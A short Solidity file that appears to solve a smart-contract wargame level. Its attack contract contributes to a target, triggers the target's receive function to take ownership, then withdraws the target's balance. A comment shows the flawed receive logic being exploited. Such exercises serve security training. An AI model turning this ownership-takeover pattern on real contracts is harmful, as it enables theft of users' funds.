// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import {Broadcasted} from "./Broadcasted.sol";

contract FallbackAttk is Broadcasted {
    function attack(address payable fallbackCtr_) public payable override {
        // contribute to have contributions[msg.sender] > 0
        IFallback(fallbackCtr_).contribute{value: 0.00001 ether}();
        // call fallback function
        fallbackCtr_.call{value: 0.00001 ether}("");
        // withdraw
        IFallback(fallbackCtr_).withdraw();
    }
}

interface IFallback {
    function contribute() external payable;

    function getContribution() external view returns (uint);

    function withdraw() external;

    function owner() external view returns (address);

    // ! function that need to be broken
    //   receive() external payable {
    //   require(msg.value > 0 && contributions[msg.sender] > 0);
    //   owner = msg.sender;
    // }
}
